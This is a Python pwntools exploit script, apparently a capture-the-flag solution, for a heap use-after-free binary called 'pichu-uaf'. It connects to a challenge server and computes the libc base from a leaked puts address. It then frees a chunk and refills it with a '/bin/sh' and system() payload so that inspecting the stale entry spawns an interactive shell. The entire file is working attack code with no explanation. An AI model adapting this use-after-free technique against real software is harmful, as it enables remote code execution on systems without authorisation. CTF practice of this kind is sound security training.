#!/usr/bin/env python3
from pwn import *

elf = ELF('./pichu-uaf')
rop = ROP(elf)
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')

context(log_level='debug', binary=elf)

if args.REMOTE:
	io = remote('ccsc.mouflonarena.com', 32217)
elif args.GDB:
	io = process(elf.path)
	gdb.attach(io)
else:
	io = process(elf.path)

def catch_pichu(name):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Name your Pichu> ', name)

def release_pichu(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index> ', str(index).encode())

def inspect_pichu(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index> ', str(index).encode())

def stash_berry(data):
    io.sendlineafter(b'> ', b'4')
    io.sendafter(b'Berry data> ', data)

io.recvuntil(b'puts@libc: ')
puts_leak = int(io.recvline().strip(), 16)
log.success(f"puts@libc: {hex(puts_leak)}")

libc.address = puts_leak - libc.sym['puts']
system = libc.sym['system']
log.success(f"Libc base: {hex(libc.address)}")
log.success(f"System: {hex(system)}")

catch_pichu(b"chunk0") #chunk0
release_pichu(0)

payload = flat([
    b'/bin/sh\x00',
    b'A' * 16,
    system
])

stash_berry(payload)

inspect_pichu(0)

io.interactive()
